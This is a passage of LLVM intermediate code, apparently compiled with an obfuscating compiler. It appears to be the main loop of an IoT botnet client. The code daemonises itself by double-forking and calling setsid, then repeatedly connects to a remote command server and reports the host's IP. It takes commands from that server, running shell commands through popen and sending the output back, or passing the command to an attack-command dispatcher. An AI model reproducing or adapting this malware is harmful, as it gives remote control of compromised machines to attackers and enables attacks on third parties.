  br i1 %49, label %43, label %._crit_edge148

._crit_edge148:                                   ; preds = %43
  %50 = icmp eq i32 %..099, 0
  %51 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br i1 %50, label %52, label %60

; <label>:52:                                     ; preds = %._crit_edge148.thread, %._crit_edge148
  %53 = call %struct._IO_FILE* @fopen(i8* %.091106, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.548, i64 0, i64 0))
  %54 = icmp eq %struct._IO_FILE* %53, null
  br i1 %54, label %60, label %55

; <label>:55:                                     ; preds = %52
  %56 = call i32 @fputs(i8* nonnull %37, %struct._IO_FILE* nonnull %53)
  %57 = call i32 @fclose(%struct._IO_FILE* nonnull %53)
  br label %60

; <label>:58:                                     ; preds = %.thread
  %59 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br label %60

; <label>:60:                                     ; preds = %52, %21, %58, %._crit_edge148, %55
  %61 = call i32 @getOurIP()
  %62 = call i32 @fork() #3
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %66, label %64

; <label>:64:                                     ; preds = %60
  %65 = call i32 @waitpid(i32 %62, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:66:                                     ; preds = %60
  %67 = call i32 @fork() #3
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %70, label %69

; <label>:69:                                     ; preds = %66
  call void @exit(i32 0) #17
  unreachable

; <label>:70:                                     ; preds = %66
  %71 = call i32 @setsid() #3
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i64 0, i64 0)) #3
  %73 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 1
  %76 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 0
  br label %.outer

.outer:                                           ; preds = %142, %70
  %.089.ph = phi i32 [ %143, %142 ], [ 0, %70 ]
  br label %.backedge113

.backedge113.loopexit:                            ; preds = %.backedge
  br label %.backedge113.backedge

.backedge113:                                     ; preds = %.backedge113.backedge, %.outer
  %77 = call i32 @initConnection()
  %78 = icmp eq i32 %77, 0
  br i1 %78, label %81, label %79

; <label>:79:                                     ; preds = %.backedge113
  %80 = call i32 @sleep(i32 30) #3
  br label %.backedge113.backedge

; <label>:81:                                     ; preds = %.backedge113
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %84 = call i8* @inet_ntoa(i32 %83) #3
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %82, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.550, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i64 0, i64 0), i8* %84)
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 @recvLine(i32 %86, i8* nonnull %74, i32 4096)
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %.backedge113.backedge, label %.preheader111.preheader

.backedge113.backedge:                            ; preds = %81, %79, %.backedge113.loopexit
  br label %.backedge113

.preheader111.preheader:                          ; preds = %81
  br label %.preheader111

.preheader111:                                    ; preds = %.preheader111.preheader, %.backedge
  %89 = phi i32 [ %139, %.backedge ], [ %87, %.preheader111.preheader ]
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp eq i64 %90, 0
  br i1 %91, label %._crit_edge132, label %.lr.ph131.preheader

.lr.ph131.preheader:                              ; preds = %.preheader111
  br label %.lr.ph131

.lr.ph131:                                        ; preds = %.lr.ph131.preheader, %.lr.ph131._crit_edge
  %indvars.iv = phi i64 [ %97, %.lr.ph131._crit_edge ], [ 0, %.lr.ph131.preheader ]
  %92 = load i32*, i32** @pids, align 8
  %93 = getelementptr inbounds i32, i32* %92, i64 %indvars.iv
  %94 = load i32, i32* %93, align 4
  %95 = call i32 @waitpid(i32 %94, i32* null, i32 1) #3
  %96 = icmp sgt i32 %95, 0
  %97 = add nuw i64 %indvars.iv, 1
  br i1 %96, label %.preheader, label %.lr.ph131._crit_edge

.preheader:                                       ; preds = %.lr.ph131
  %98 = load i64, i64* @numpids, align 8
  %99 = icmp ult i64 %97, %98
  %100 = load i32*, i32** @pids, align 8
  %101 = trunc i64 %indvars.iv to i32
  br i1 %99, label %.lr.ph122.preheader, label %._crit_edge123

.lr.ph122.preheader:                              ; preds = %.preheader
  %102 = trunc i64 %97 to i32
  br label %.lr.ph122

.lr.ph122:                                        ; preds = %.lr.ph122.preheader, %.lr.ph122
  %103 = phi i32* [ %112, %.lr.ph122 ], [ %100, %.lr.ph122.preheader ]
  %104 = phi i64 [ %109, %.lr.ph122 ], [ %97, %.lr.ph122.preheader ]
  %.094121 = phi i32 [ %.094, %.lr.ph122 ], [ %102, %.lr.ph122.preheader ]
  %.094.in120 = phi i32 [ %.094121, %.lr.ph122 ], [ %101, %.lr.ph122.preheader ]
  %105 = getelementptr inbounds i32, i32* %103, i64 %104
  %106 = load i32, i32* %105, align 4
  %107 = zext i32 %.094.in120 to i64
  %108 = getelementptr inbounds i32, i32* %103, i64 %107
  store i32 %106, i32* %108, align 4
  %.094 = add i32 %.094121, 1
  %109 = zext i32 %.094 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  %112 = load i32*, i32** @pids, align 8
  br i1 %111, label %.lr.ph122, label %._crit_edge123.loopexit

._crit_edge123.loopexit:                          ; preds = %.lr.ph122
  br label %._crit_edge123

._crit_edge123:                                   ; preds = %._crit_edge123.loopexit, %.preheader
  %.094.in.lcssa = phi i32 [ %101, %.preheader ], [ %.094121, %._crit_edge123.loopexit ]
  %.lcssa = phi i32* [ %100, %.preheader ], [ %112, %._crit_edge123.loopexit ]
  %113 = zext i32 %.094.in.lcssa to i64
  %114 = getelementptr inbounds i32, i32* %.lcssa, i64 %113
  store i32 0, i32* %114, align 4
  %115 = load i64, i64* @numpids, align 8
  %116 = add i64 %115, -1
  store i64 %116, i64* @numpids, align 8
  %117 = shl i64 %115, 2
  %118 = call noalias i8* @malloc(i64 %117) #3
  %119 = bitcast i8* %118 to i32*
  %120 = icmp eq i64 %116, 0
  %121 = load i32*, i32** @pids, align 8
  br i1 %120, label %._crit_edge128, label %.lr.ph127.preheader

.lr.ph127.preheader:                              ; preds = %._crit_edge123
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %.lr.ph127
  %122 = phi i64 [ %127, %.lr.ph127 ], [ 0, %.lr.ph127.preheader ]
  %.195125 = phi i32 [ %126, %.lr.ph127 ], [ 0, %.lr.ph127.preheader ]
  %123 = getelementptr inbounds i32, i32* %121, i64 %122
  %124 = load i32, i32* %123, align 4
  %125 = getelementptr inbounds i32, i32* %119, i64 %122
  store i32 %124, i32* %125, align 4
  %126 = add i32 %.195125, 1
  %127 = zext i32 %126 to i64
  %128 = icmp ult i64 %127, %116
  br i1 %128, label %.lr.ph127, label %._crit_edge128.loopexit

._crit_edge128.loopexit:                          ; preds = %.lr.ph127
  br label %._crit_edge128

._crit_edge128:                                   ; preds = %._crit_edge128.loopexit, %._crit_edge123
  %129 = bitcast i32* %121 to i8*
  call void @free(i8* %129) #3
  store i8* %118, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph131._crit_edge

.lr.ph131._crit_edge:                             ; preds = %.lr.ph131, %._crit_edge128
  %sext162 = shl i64 %97, 32
  %130 = ashr exact i64 %sext162, 32
  %131 = load i64, i64* @numpids, align 8
  %132 = icmp ult i64 %130, %131
  br i1 %132, label %.lr.ph131, label %._crit_edge132.loopexit

._crit_edge132.loopexit:                          ; preds = %.lr.ph131._crit_edge
  br label %._crit_edge132

._crit_edge132:                                   ; preds = %._crit_edge132.loopexit, %.preheader111
  %133 = sext i32 %89 to i64
  %134 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %133
  store i8 0, i8* %134, align 1
  call void @trim(i8* nonnull %74)
  %strncmp = call i32 @strncmp(i8* nonnull %74, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %135, label %141

; <label>:135:                                    ; preds = %._crit_edge132
  %136 = load i32, i32* @mainCommSock, align 4
  %137 = call i32 (i32, i8*, ...) @sockprintf(i32 %136, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.551, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph144
  br label %.backedge

.backedge.loopexit173:                            ; preds = %.preheader150
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit173, %.backedge.loopexit, %._crit_edge141.thread, %135, %._crit_edge141, %147, %179
  %138 = load i32, i32* @mainCommSock, align 4
  %139 = call i32 @recvLine(i32 %138, i8* nonnull %74, i32 4096)
  %140 = icmp eq i32 %139, -1
  br i1 %140, label %.backedge113.loopexit, label %.preheader111

; <label>:141:                                    ; preds = %._crit_edge132
  %strncmp101 = call i32 @strncmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.552, i64 0, i64 0), i64 3)
  %cmp102 = icmp eq i32 %strncmp101, 0
  br i1 %cmp102, label %142, label %147

; <label>:142:                                    ; preds = %141
  %143 = add nuw nsw i32 %.089.ph, 1
  %144 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i64 0, i64 0))
  %145 = icmp sgt i32 %.089.ph, 19
  br i1 %145, label %146, label %.outer

; <label>:146:                                    ; preds = %142
  call void @exit(i32 0) #17
  unreachable

; <label>:147:                                    ; preds = %141
  %148 = load i8, i8* %74, align 16
  %149 = icmp eq i8 %148, 33
  br i1 %149, label %.preheader150.preheader, label %.backedge

.preheader150.preheader:                          ; preds = %147
  br label %.preheader150

.preheader150:                                    ; preds = %.preheader150.preheader, %151
  %.092 = phi i8* [ %152, %151 ], [ %75, %.preheader150.preheader ]
  %150 = load i8, i8* %.092, align 1
  switch i8 %150, label %151 [
    i8 0, label %.backedge.loopexit173
    i8 32, label %153
  ]

; <label>:151:                                    ; preds = %.preheader150
  %152 = getelementptr inbounds i8, i8* %.092, i64 1
  br label %.preheader150

; <label>:153:                                    ; preds = %.preheader150
  store i8 0, i8* %.092, align 1
  %154 = call i64 @strlen(i8* %75) #15
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 %154
  %156 = getelementptr inbounds i8, i8* %155, i64 2
  br label %157

; <label>:157:                                    ; preds = %162, %153
  %158 = call i64 @strlen(i8* %156) #15
  %159 = add i64 %158, -1
  %160 = getelementptr inbounds i8, i8* %156, i64 %159
  %161 = load i8, i8* %160, align 1
  switch i8 %161, label %.preheader109.preheader [
    i8 13, label %162
    i8 10, label %162
  ]

.preheader109.preheader:                          ; preds = %157
  br label %.preheader109

; <label>:162:                                    ; preds = %157, %157
  store i8 0, i8* %160, align 1
  br label %157

.preheader109:                                    ; preds = %.preheader109.preheader, %164
  %.093 = phi i8* [ %165, %164 ], [ %156, %.preheader109.preheader ]
  %163 = load i8, i8* %.093, align 1
  switch i8 %163, label %164 [
    i8 32, label %166
    i8 0, label %166
  ]

; <label>:164:                                    ; preds = %.preheader109
  %165 = getelementptr inbounds i8, i8* %.093, i64 1
  br label %.preheader109

; <label>:166:                                    ; preds = %.preheader109, %.preheader109
  store i8 0, i8* %.093, align 1
  %167 = getelementptr inbounds i8, i8* %.093, i64 1
  %168 = load i8, i8* %156, align 1
  %169 = icmp eq i8 %168, 0
  br i1 %169, label %._crit_edge136, label %.lr.ph135.preheader

.lr.ph135.preheader:                              ; preds = %166
  br label %.lr.ph135

.lr.ph135:                                        ; preds = %.lr.ph135.preheader, %.lr.ph135
  %170 = phi i8 [ %175, %.lr.ph135 ], [ %168, %.lr.ph135.preheader ]
  %.090133 = phi i8* [ %174, %.lr.ph135 ], [ %156, %.lr.ph135.preheader ]
  %171 = zext i8 %170 to i32
  %172 = call i32 @toupper(i32 %171) #15
  %173 = trunc i32 %172 to i8
  store i8 %173, i8* %.090133, align 1
  %174 = getelementptr inbounds i8, i8* %.090133, i64 1
  %175 = load i8, i8* %174, align 1
  %176 = icmp eq i8 %175, 0
  br i1 %176, label %._crit_edge136.loopexit, label %.lr.ph135

._crit_edge136.loopexit:                          ; preds = %.lr.ph135
  br label %._crit_edge136

._crit_edge136:                                   ; preds = %._crit_edge136.loopexit, %166
  %177 = call i32 @strcmp(i8* %156, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.554, i64 0, i64 0)) #15
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %194

; <label>:179:                                    ; preds = %._crit_edge136
  %180 = call i32 @listFork()
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %182, label %.backedge

; <label>:182:                                    ; preds = %179
  %183 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %183, i8 0, i64 1024, i32 16, i1 false)
  %184 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %183, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i64 0, i64 0), i8* %167)
  %185 = call i32 @fdpopen(i8* nonnull %183, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %186 = call i8* @fdgets(i8* nonnull %183, i32 1024, i32 %185)
  %187 = icmp eq i8* %186, null
  br i1 %187, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %182
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %183)
  %188 = load i32, i32* @mainCommSock, align 4
  %189 = call i32 (i32, i8*, ...) @sockprintf(i32 %188, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i64 0, i64 0), i8* nonnull %183)
  call void @llvm.memset.p0i8.i64(i8* nonnull %183, i8 0, i64 1024, i32 16, i1 false)
  %190 = call i32 @sleep(i32 1) #3
  %191 = call i8* @fdgets(i8* nonnull %183, i32 1024, i32 %185)
  %192 = icmp eq i8* %191, null
  br i1 %192, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %182
  %193 = call i32 @fdpclose(i32 %185)
  call void @exit(i32 0) #17
  unreachable

; <label>:194:                                    ; preds = %._crit_edge136
  %195 = call i8* @strtok(i8* %167, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i64 0, i64 0)) #3
  store i8* %156, i8** %76, align 16
  %196 = icmp eq i8* %195, null
  br i1 %196, label %._crit_edge141.thread, label %.lr.ph140.preheader

.lr.ph140.preheader:                              ; preds = %194
  br label %.lr.ph140

._crit_edge141.thread:                            ; preds = %194
  call void @processCmd(i32 1, i8** nonnull %76)
  br label %.backedge

.lr.ph140:                                        ; preds = %.lr.ph140.preheader, %209
  %.087138 = phi i8* [ %210, %209 ], [ %195, %.lr.ph140.preheader ]
  %.088137 = phi i32 [ %.1, %209 ], [ 1, %.lr.ph140.preheader ]
  %197 = load i8, i8* %.087138, align 1
  %198 = icmp eq i8 %197, 10
  br i1 %198, label %209, label %199

; <label>:199:                                    ; preds = %.lr.ph140
  %200 = call i64 @strlen(i8* nonnull %.087138) #15
  %201 = add i64 %200, 1
  %202 = call noalias i8* @malloc(i64 %201) #3
  %203 = sext i32 %.088137 to i64
  %204 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %203
  store i8* %202, i8** %204, align 8
  %205 = call i64 @strlen(i8* nonnull %.087138) #15
  %206 = add i64 %205, 1
  call void @llvm.memset.p0i8.i64(i8* %202, i8 0, i64 %206, i32 1, i1 false)
  %207 = call i8* @strcpy(i8* %202, i8* nonnull %.087138) #3
  %208 = add nsw i32 %.088137, 1
  br label %209

; <label>:209:                                    ; preds = %.lr.ph140, %199
  %.1 = phi i32 [ %208, %199 ], [ %.088137, %.lr.ph140 ]
  %210 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i64 0, i64 0)) #3
  %211 = icmp eq i8* %210, null
  br i1 %211, label %._crit_edge141, label %.lr.ph140

._crit_edge141:                                   ; preds = %209
  call void @processCmd(i32 %.1, i8** nonnull %76)
  %212 = icmp sgt i32 %.1, 1
  br i1 %212, label %.lr.ph144.preheader, label %.backedge

.lr.ph144.preheader:                              ; preds = %._crit_edge141
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph144

.lr.ph144:                                        ; preds = %.lr.ph144.preheader, %.lr.ph144
  %indvars.iv158 = phi i64 [ %indvars.iv.next159, %.lr.ph144 ], [ 1, %.lr.ph144.preheader ]
  %213 = getelementptr inbounds [10 x i8*], [10 x i8*]* %9, i64 0, i64 %indvars.iv158
  %214 = load i8*, i8** %213, align 8
  call void @free(i8* %214) #3
  %indvars.iv.next159 = add nuw nsw i64 %indvars.iv158, 1
  %exitcond = icmp eq i64 %indvars.iv.next159, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph144
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fputs(i8* nocapture readonly, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146579359}
!14 = !{i32 -2146577974}
!15 = !{i32 -2146577214}
!16 = !{i32 -2146576391}
!17 = distinct !{!17, !2, !3}
!18 = distinct !{!18, !19, !2, !3}
!19 = !{!"llvm.loop.unroll.runtime.disable"}
!20 = !{i32 -2146575484}
